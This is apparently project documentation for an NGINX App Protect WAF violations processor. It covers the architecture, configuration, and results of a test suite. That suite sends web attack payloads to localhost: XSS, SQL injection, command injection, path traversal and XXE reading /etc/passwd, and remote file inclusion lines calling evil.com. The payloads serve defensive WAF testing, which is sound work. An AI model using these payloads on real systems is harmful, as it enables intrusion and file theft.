# NGINX App Protect Security Violations Processor

## Introduction

The Security Violations Processor is a custom OpenTelemetry Collector processor designed to ingest, parse, and transform NGINX App Protect (NAP) WAF violation events into structured protobuf messages. This processor enables real-time security monitoring and analysis of web application attacks by consuming syslog messages from NAP v4 & v5, and converts them into a standardized `SecurityViolationEvent` protobuf format. This protobuf payload is then encoded as bytes, and forwarded as a log record.

### Purpose

NGINX App Protect generates security violation events over syslog. While syslog is universally supported and easy to configure, text-based formats are inefficient for machine processing at scale: they require string parsing, have no type safety, consume significant bandwidth, and lack native support for complex nested structures like violation details with multiple signature matches.

This processor exists to transform these text-formatted syslog messages into **structured, efficiently encoded protobuf messages** that are optimized for programmatic consumption.

Downstream consumers benefit from:
- **Shared versioned contract**: The `SecurityViolationEvent` protobuf schema serves as a strongly-typed API contract between NAP and consuming systems, with built-in backwards compatibility.
- **Efficient binary encoding**: Protobuf's compact binary format significantly reduces bandwidth and storage costs compared to text-based formats
- **Zero parsing overhead**: Pre-structured data eliminates the need for regex parsing, string splitting, or JSON deserialization in downstream systems
- **Language-agnostic integration**: Automatic code generation for 10+ languages (Go, Python, Java, etc.) means consumers can work with native data structures
- **Type safety**: Strongly-typed fields (enums, repeated fields, nested messages) prevent runtime errors and enable compile-time validation

### Architecture Context

The processor operates within the NGINX Agent's OpenTelemetry Collector pipeline:

```
NGINX App Protect v4/v5 → Syslog/UDP → Security Violations Processor → Batch Processor → OTLP Exporter
    (localhost/docker0)      (:1514)            (Protobuf)                                   (Logs)
```

**Key Components:**
- **NGINX App Protect (NAP) v4/v5**: Generates security violation events when requests violate WAF policy
- **Syslog Server**: Listens on UDP port 1514
    - **NAP v4**: Configured to send to `127.0.0.1:1514` (localhost)
    - **NAP v5**: Configured to send to docker0 interface IP (e.g., `172.17.0.1:1514` or dynamically discovered)
- **Security Violations Processor**: Custom OTel processor that parses and transforms events
- **Protobuf Schema**: Defines the canonical `SecurityViolationEvent` message format
- **Exporters**: Forward structured events to observability backends

## Architecture

### Component Overview

```
┌────────────────────────────────────────────────────────────────────┐
│                    NGINX App Protect Process/Container             │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │  WAF Policy: for example: nms_app_protect_strict_policy     │   │
│  │  - Cross-Site Scripting detection                           │   │
│  │  - SQL Injection detection                                  │   │
│  │  - Command Injection detection                              │   │
│  │  - File type restrictions                                   │   │
│  │  - Bot detection                                            |   |
|  |  - ...                                                      │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                              │                                     │
│                              │ Syslog                              │
│                              ▼                                     │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │  Syslog Destination: syslog:server=127.0.0.1:1514           │   │
│  │  Format: "custom_csv_format"                                │   │
│  └─────────────────────────────────────────────────────────────┘   │
└────────────────────────────────────────────────────────────────────┘
                              │
                              │ UDP Port 1514
                              │ 
                              ▼
┌────────────────────────────────────────────────────────────────────┐
│                    NGINX Agent (OTel Collector)                    │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │  Receiver: syslog/default-security-events                   │   │
│  │  - Protocol: RFC5424                                        │   │
│  │  - UDP Listener: 127.0.0.1:1514                             │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                              │                                     │
│                              ▼                                     │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │  Processor: securityviolations/default                      │   │
│  │  ┌─────────────────────────────────────────────────────────┐│   │
│  │  │ 1. Extract syslog structured data (hostname, priority)  ││   │
│  │  │ 2. Parse CSV body in log profile field order            ││   │
│  │  │ 3. Extract XML violation, signatures and context details││   │
│  │  │ 4. Map fields to SecurityViolationEvent protobuf        ││   │
│  │  │ 5. Add resource attributes (system_id, nginx.id)        ││   │
│  │  └─────────────────────────────────────────────────────────┘│   │
│  └─────────────────────────────────────────────────────────────┘   │
│                              │                                     │
│                              ▼                                     │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │  Processor: batch/logs                                      │   │
│  │  - Batches logs for efficient transport                     │   │
│  │  - send_batch_size: 1000                                    │   │
│  │  - timeout: 30s                                             │   │
│  └─────────────────────────────────────────────────────────────┘   │
│                              │                                     │
│                              ▼                                     │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │  Exporter: OTLP                                             │   │
│  │  - Forwards OTLP formatted logs to N1 Console               │   │
│  └─────────────────────────────────────────────────────────────┘   │
└────────────────────────────────────────────────────────────────────┘
```

## Testing and Analysis

#### Dataplane Setup

##### Added the following configuration to agent
```yaml
features:
  - logs-nap 

collector:
  exporters:
    debug: {}
  processors:
    batch:
      "logs":
        send_batch_size: 1000
        timeout: 30s
        send_batch_max_size: 1000
  pipelines:
   logs:
     "default-security-events":
       receivers: ["tcplog/nginx_app_protect"]
       processors: ["securityviolations/default","batch/logs"]
       exporters: ["debug","otlp/default"]
```

##### NGINX App Protect Configuration

```nginx
# NAP v5 Policy and Logging
app_protect_enable on;
app_protect_policy_file "/etc/nms/NginxStrictPolicy.tgz";
app_protect_security_log_enable on;
app_protect_security_log "/etc/nms/secops_dashboard.tgz" syslog:server=192.0.10.1:1514;
```

##### Log Profile (`secops_dashboard.tgz`):
```json
{
    "filter": {
        "request_type": "illegal"
    },
    "content": {
        "format": "user-defined",
        "format_string": "%blocking_exception_reason%,%dest_port%,%ip_client%,%is_truncated_bool%,%method%,%policy_name%,%protocol%,%request_status%,%response_code%,%severity%,%sig_cves%,%sig_set_names%,%src_port%,%sub_violations%,%support_id%,%threat_campaign_names%,%violation_rating%,%vs_name%,%x_forwarded_for_header_value%,%outcome%,%outcome_reason%,%violations%,%violation_details%,%bot_signature_name%,%bot_category%,%bot_anomalies%,%enforced_bot_anomalies%,%client_class%,%client_application%,%client_application_version%,%transport_protocol%,%uri%,%request%",
        "escaping_characters": [
            {
                "from": ",",
                "to": "%2C"
            }
        ],
        "max_request_size": "2048",
        "max_message_size": "5k",
        "list_delimiter": "::"
    }
}
```
### Test Suite Overview

A comprehensive test suite was run to test the processor's ability to detect and report various attack types. The suite sends 47 malicious requests across 14 attack categories.

**Test Script Metrics:**
- **Total Requests:** 47
- **Expected Violations:** 36
- **Actual Violations Observed:** 36

### Test Categories and Results

#### 1. Cross-Site Scripting (XSS) - 5 tests ✅
```bash
# Test 1: <script> tag in URL parameter
curl -s 'http://127.0.0.1/page?search=<script>alert("XSS")</script>'
# Result: BLOCKED
# Violations: VIOL_ATTACK_SIGNATURE (sig_id: 200001475, 200000098, 200001088, 200101609)
#             VIOL_PARAMETER_VALUE_METACHAR, VIOL_HTTP_PROTOCOL, VIOL_BOT_CLIENT
#             VIOL_RATING_THREAT (rating=5)
```

**Analysis:**
- All 5 XSS tests successfully blocked
- Multiple signature IDs matched per request (Cross Site Scripting Signatures set)
- Violation rating: 4-5 (Threat/Critical)

#### 2. SQL Injection - 6 tests ✅
```bash
# Test 2: SQL comment bypass
curl -s "http://127.0.0.1/?user=admin'--"
# Result: BLOCKED
# Violations: VIOL_ATTACK_SIGNATURE (sig_id: 200002444)
#             VIOL_PARAMETER_VALUE_METACHAR, VIOL_HTTP_PROTOCOL, VIOL_BOT_CLIENT
#             VIOL_RATING_NEED_EXAMINATION (rating=3)
```

**Analysis:**
- 6/6 SQL injection tests blocked
- Signature sets: SQL Injection Signatures
- Lower violation rating (3) for comment-based attacks vs UNION/OR attacks (5)

#### 3. Illegal File Types - 4 tests ✅ (3 blocked, 1 alerted)
```bash
# Test 3: .tmp file access
curl -s 'http://127.0.0.1/myfile.tmp'
# Result: BLOCKED
# Violations: VIOL_FILETYPE, VIOL_HTTP_PROTOCOL, VIOL_BOT_CLIENT
# Rating: 2

# Test 4: .sql file access
curl -s 'http://127.0.0.1/database.sql'
# Result: ALERTED (404 response allowed through)
# Violations: VIOL_HTTP_PROTOCOL, VIOL_BOT_CLIENT
# Rating: 2
```

**Analysis:**
- .tmp, .bak, .env: BLOCKED
- .sql: ALERTED only (policy-specific exception for non-existent files)

#### 4. Illegal HTTP Methods - 1 test ✅
```bash
# Test 5: SEARCH method
curl -s -X SEARCH 'http://127.0.0.1/hello'
# Result: BLOCKED
# Violations: VIOL_METHOD, VIOL_HTTP_PROTOCOL, VIOL_BOT_CLIENT
```

#### 5. URL Metacharacters - 5 tests ✅ (4 blocked)
```bash
# Test 6: Angle brackets in URL
curl -s 'http://127.0.0.1/test<test>page'
# Result: BLOCKED
# Violations: VIOL_URL_METACHAR (2 instances), VIOL_HTTP_PROTOCOL, VIOL_BOT_CLIENT
#             VIOL_RATING_NEED_EXAMINATION

# Test 7: Null byte encoding
curl -s 'http://127.0.0.1/file%00.txt'
# Result: BLOCKED (Unparsable request content)
```

**Analysis:**
- Null byte: Severe protocol violation (unparsable request)
- Semicolon test: ALERTED (not enforced in some strict policies)

#### 6. Command Injection - 5 tests ✅
```bash
# Test 8: Backtick command substitution
curl -s 'http://127.0.0.1/cmd?`whoami`'
# Result: BLOCKED
# Violations: VIOL_ATTACK_SIGNATURE (sig_id: 200003069), VIOL_PARAMETER_NAME_METACHAR
#             VIOL_HTTP_PROTOCOL, VIOL_BOT_CLIENT, VIOL_RATING_NEED_EXAMINATION
```

**Analysis:**
- All command injection tests blocked
- Signature sets: Command Execution Signatures, OS Command Injection Signatures
- Detected in parameters and URIs

#### 7. Path Traversal - 4 tests ✅
```bash
# Test 9: Encoded path traversal
curl -s 'http://127.0.0.1/download?file=..%2F..%2Fetc%2Fpasswd'
# Result: BLOCKED
# Violations: VIOL_ATTACK_SIGNATURE (6 signature IDs matched!)
#             VIOL_HTTP_PROTOCOL, VIOL_BOT_CLIENT, VIOL_RATING_THREAT (rating=5)
# Signature sets: Path Traversal Signatures, Predictable Resource Location

# Test 10: Double-encoded path traversal
curl -s 'http://127.0.0.1/file?path=%252e%252e%252f%252e%252e%252fetc%252fpasswd'
# Result: BLOCKED
# Violations: VIOL_EVASION (Multiple decoding), VIOL_ATTACK_SIGNATURE
#             VIOL_HTTP_PROTOCOL, VIOL_BOT_CLIENT, VIOL_RATING_THREAT (rating=5)
```

**Analysis:**
- High-fidelity detection: 6 signature matches for encoded traversal
- Evasion detection: Double-encoding flagged as evasion technique
- Critical severity (rating=5)

#### 8. HTTP Header Attacks - 2 tests ✅
```bash
# Test 11: XSS in custom header
curl -s -H 'X-Test: <script>alert(1)</script>' 'http://127.0.0.1/'
# Result: BLOCKED
# Violations: VIOL_ATTACK_SIGNATURE (in header context)
#             VIOL_HTTP_PROTOCOL, VIOL_BOT_CLIENT, VIOL_RATING_THREAT (rating=4)
```

#### 9. Cookie Attacks - 3 tests ⚠️ (2 blocked, 1 alerted)
```bash
# Test 12: XSS in cookie
curl -s -H 'Cookie: session=<script>alert(1)</script>' 'http://127.0.0.1/'
# Result: BLOCKED
# Violations: VIOL_ATTACK_SIGNATURE (in cookie context), VIOL_RATING_THREAT

# Test 13: Null byte in cookie
curl -s -H 'Cookie: data=test%00admin' 'http://127.0.0.1/'
# Result: ALERTED (not enforced)
```

#### 10. Parameter Tampering - 2 tests ✅
```bash
# Test 14: XSS in parameter
curl -s 'http://127.0.0.1/?userId=<script>alert(1)</script>'
# Result: BLOCKED
# Violations: VIOL_ATTACK_SIGNATURE, VIOL_PARAMETER_VALUE_METACHAR
#             VIOL_HTTP_PROTOCOL, VIOL_BOT_CLIENT, VIOL_RATING_THREAT (rating=5)
```

#### 11. Sensitive File Access - 3 tests ✅
```bash
# Test 15: .git directory access
curl -s 'http://127.0.0.1/.git/config'
# Result: BLOCKED
# Violations: VIOL_ATTACK_SIGNATURE (Predictable Resource Location)
#             VIOL_HTTP_PROTOCOL, VIOL_BOT_CLIENT, VIOL_RATING_THREAT (rating=4)
```

#### 12. Remote File Inclusion (RFI) - 3 tests ⚠️ (1 blocked, 2 alerted)
```bash
# Test 16: FTP protocol RFI
curl -s 'http://127.0.0.1/?load=ftp://evil.com/backdoor.php'
# Result: BLOCKED
# Violations: VIOL_ATTACK_SIGNATURE (sig_id: 200018151)
#             VIOL_RATING_NEED_EXAMINATION

# Test 17: HTTP protocol RFI
curl -s 'http://127.0.0.1/?page=http://evil.com/shell.txt'
# Result: ALERTED (not blocked with strict policy)
```

**Analysis:**
- FTP protocol: Blocked (explicit protocol detection)
- HTTP/HTTPS in parameters: Alerted only (policy-dependent)

#### 13. API/JSON Attacks - 3 tests ✅
```bash
# Test 18: XXE (XML External Entity)
curl -s -X POST 'http://127.0.0.1/api/data' \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
# Result: BLOCKED
# Violations: VIOL_ATTACK_SIGNATURE, VIOL_XML_MALFORMED
#             VIOL_HTTP_PROTOCOL, VIOL_BOT_CLIENT, VIOL_RATING_THREAT (rating=4)
```

#### 14. HTTP Protocol Violations - 1 test ⚠️ (alerted)
```bash
# Test 19: IP address in Host header
curl -s -H 'Host: 127.0.0.1' 'http://127.0.0.1/'
# Result: ALERTED (200 response)
# Violations: VIOL_HTTP_PROTOCOL, VIOL_BOT_CLIENT
```

**Note:** All requests trigger `VIOL_HTTP_PROTOCOL` because curl sends IP in Host header by default.

### Observed Violation Patterns

#### Request Outcomes Distribution
```
BLOCKED:  30 violations (83.3%)
ALERTED:   6 violations (16.7%)
Total:    36 violations
```

#### Violation Type Frequency
```
VIOL_HTTP_PROTOCOL:           36/36 (100%)  - All requests (IP in Host)
VIOL_BOT_CLIENT:              36/36 (100%)  - All requests (curl detected)
VIOL_ATTACK_SIGNATURE:        25/36 (69%)   - Most attack patterns
VIOL_PARAMETER_VALUE_METACHAR: 8/36 (22%)   - Parameter attacks
VIOL_RATING_THREAT:           11/36 (31%)   - Critical severity
VIOL_RATING_NEED_EXAMINATION:  9/36 (25%)   - Medium severity
VIOL_FILETYPE:                 3/36 (8%)    - File restrictions
VIOL_METHOD:                   1/36 (3%)    - HTTP method violations
VIOL_URL_METACHAR:             3/36 (8%)    - URL special chars
VIOL_EVASION:                  1/36 (3%)    - Encoding evasion
VIOL_XML_MALFORMED:            1/36 (3%)    - XML attacks
VIOL_HEADER_METACHAR:          2/36 (6%)    - Header attacks
```

#### Signature Set Effectiveness
```
Cross Site Scripting Signatures:   5 detections
SQL Injection Signatures:          7 detections
Command Execution Signatures:      5 detections
Path Traversal Signatures:         4 detections
Predictable Resource Location:     6 detections
Generic Detection (High/Medium):  12 detections
Other Application Attacks:         2 detections
```


---

**Document Version:** 1.0  
**Last Updated:** January 29, 2026  
**Author:** NGINX Agent Team  
**Status:** Published
